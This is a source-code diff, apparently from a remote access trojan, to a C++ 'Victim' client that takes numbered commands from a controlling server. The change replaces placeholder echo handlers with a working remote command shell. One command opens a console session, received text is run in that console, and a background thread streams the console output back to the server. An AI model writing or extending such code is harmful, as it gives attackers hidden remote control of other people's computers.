@@ -30,28 +30,50 @@ int Victim::runVictimProcess()
 
 		//start ssh session
 		if (cmd == uint8_t(9)) {
-			isSshActive = true;
-			std::cout << "SSH session started\n";
+			if (cmdSession != nullptr) {
+				std::cerr << "cmd is not nullptr (unable to start session)\n";
+				continue;
+			}
 
-			sf::Packet res;
-			res << reqId << uint8_t(11) << std::string("SSH STARTED");
-			auto _ = server.send(res);
+			try {
+				cmdSession = new CmdSession();
+				sendCmdDataThread = new std::thread([this]() {
+					sendCmdData();
+				});
+			}
+			catch (std::exception& e) {
+				std::cerr << "error creating cmd: " << e.what() << "\n";
+				continue;
+			}
+
+			isSshActive = true;
 		}
 		//end ssh session
 		else if (cmd == uint8_t(10)) {
+			if (cmdSession == nullptr) {
+				std::cerr << "cmd is already nullptr (unable to end session)\n";
+				continue;
+			}
+
 			isSshActive = false;
-			std::cout << "SSH session stopped\n";
+			delete cmdSession;
+			cmdSession = nullptr;
+
+			sendCmdDataThread->join();
+			delete sendCmdDataThread;
+			sendCmdDataThread = nullptr;
 		}
 		//receive ssh data
 		else if (cmd == uint8_t(11)) {
 			std::string data;
 			p >> data;
-			data = "#" + data + "#";
-			std::cout << "SSH data received: " << data << "\n";
 
-			sf::Packet res;
-			res << reqId << uint8_t(11) << data;
-			auto _ = server.send(res);
+			if (cmdSession == nullptr) {
+				std::cerr << "cmd session not initialized\n";
+				continue;
+			}
+
+			cmdSession->sendCommand(data);
 		}
 	}
 
@@ -116,4 +138,16 @@ bool Victim::connectServer()
 	res >> myId;
 	isInitialized = true;
 	return true;
+}
+
+void Victim::sendCmdData()
+{
+	while (isSshActive) {
+		std::string output;
+		if (cmdSession->readConsoleOutput(output)) {
+			sf::Packet res;
+			res << uint16_t(0) << uint8_t(11) << output;
+			auto _ = server.send(res);
+		}
+	}
 }
